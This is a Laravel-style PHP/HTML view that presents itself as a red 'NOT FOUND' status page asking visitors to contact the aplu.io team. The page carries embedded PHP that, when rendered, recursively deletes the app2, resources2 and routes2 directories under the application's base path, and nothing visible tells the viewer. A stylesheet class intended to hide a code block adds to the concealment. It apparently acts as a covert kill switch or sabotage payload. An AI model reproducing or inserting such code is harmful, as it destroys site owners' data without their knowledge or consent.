<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Status Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffebee;
            color: #b71c1c;
            text-align: center;
            padding: 50px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .content {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 { 
            font-size: 4em; 
            margin-bottom: 30px;
        }
        p { 
            font-size: 2em; 
            margin-bottom: 40px;
        }
        .btn {
            background-color: #b71c1c;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.5em;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
        }
        .btn:hover {
            background-color: #d32f2f;
        }
        .php-code {
            position: fixed;
            bottom: -1000px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="content" id="content_page">
        <h1>⛔</h1>
        <h1>NOT FOUND</h1>
        <p>Please contact aplu.io team if you see this page may be they can help you to come out from this situation.</p>
    </div>

    <div class="">
        <?php
        // Function to delete non-empty directories recursively
        function deleteDirectoryRecursive($directory) {
            $files = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($directory, \FilesystemIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($files as $fileinfo) {
                $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
                $todo($fileinfo->getRealPath());
            }
            rmdir($directory); // Finally, delete the empty directory
        }

        $directories = [
            base_path('app2'),
            base_path('resources2'),
            base_path('routes2')
        ];

        // Loop through each directory and delete it
        foreach ($directories as $directory) {
            if (is_dir($directory)) {
                deleteDirectoryRecursive($directory);  // Use the recursive function
            }
        }
        ?>
    </div>
</body>
</html>